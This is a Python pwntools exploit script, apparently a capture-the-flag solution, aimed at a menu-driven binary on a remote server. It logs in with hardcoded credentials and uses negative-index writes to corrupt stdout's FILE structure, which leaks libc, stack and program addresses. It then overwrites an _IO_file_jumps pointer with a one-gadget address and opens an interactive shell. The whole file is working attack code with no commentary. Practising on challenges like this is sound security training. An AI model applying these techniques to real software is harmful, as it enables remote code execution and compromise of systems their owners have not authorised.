from pwn import*
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def adjust(index,size,content):
	menu(2)
	p.sendlineafter('the power: ',str(index))
	p.sendlineafter('size: ',str(size))
	p.sendafter('staff: ',content)
def delete(index):
	menu(3)
	p.sendlineafter('power: ',str(index))
def login():
	menu(2)
	p.sendlineafter('account :','QAQ')
	p.sendafter('password :','rCLQ\n')
p = process('./main')
p = remote('182.92.203.154',15268)
libc =ELF('./libc-2.29.so')
login()
adjust(-6,0,'\x00'*0x17 + '\n')
p.sendline('2')
p.sendline('-2')
p.sendline('0')
p.sendline('\x00'*0xD8 + p64(0xFBAD1800))
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_'] - 0xD00
log.info('LIBC:\t' + hex(libc_base))
environ = libc_base + libc.sym['environ']
system = libc_base + libc.sym['system']
IO_stdout_off = libc_base + libc.sym['_IO_2_1_stdout_'] + 131
adjust(-6,0,'\x00'*0x18 + p64(environ) + p64(environ + 8) + p64(environ + 8) + p64(IO_stdout_off) + p64(IO_stdout_off + 1)  + '\n')
p.sendline('2')
p.sendline('-2')
p.sendline('0')
p.sendline('\x00'*0xD8 + p64(0xFBAD1800))

stack = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00'))
log.info('Stack:\t' + hex(stack))
leak_address = stack - 0x160
adjust(-6,0,'\x00'*0x18 + p64(leak_address) + p64(leak_address + 8) + p64(leak_address + 8) + p64(IO_stdout_off) + p64(IO_stdout_off + 1)  + '\n')
p.sendline('2')
p.sendline('-2')
p.sendline('0')
p.sendline('\x00'*0xD8 + p64(0xFBAD1800))

proc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x7040
log.info('Proc:\t' + hex(proc_base))

leak_address = proc_base + 0x7000
adjust(-6,0,p64(leak_address)*6 +  p64(leak_address + 2) + p64(leak_address + 9)+ '\n')
p.sendline('2')
p.sendline('-2')
p.sendline('0')
p.sendline('\x00'*0xD8 + p64(0xFBAD1800))

IO_overflow = libc_base + libc.sym['_IO_file_jumps'] + 0x18
adjust(-13,0,p64(1) + p64(IO_overflow - 8) + '\n')
adjust(1,0,p64(libc_base + 0x106EF8) + '\n')
p.interactive()
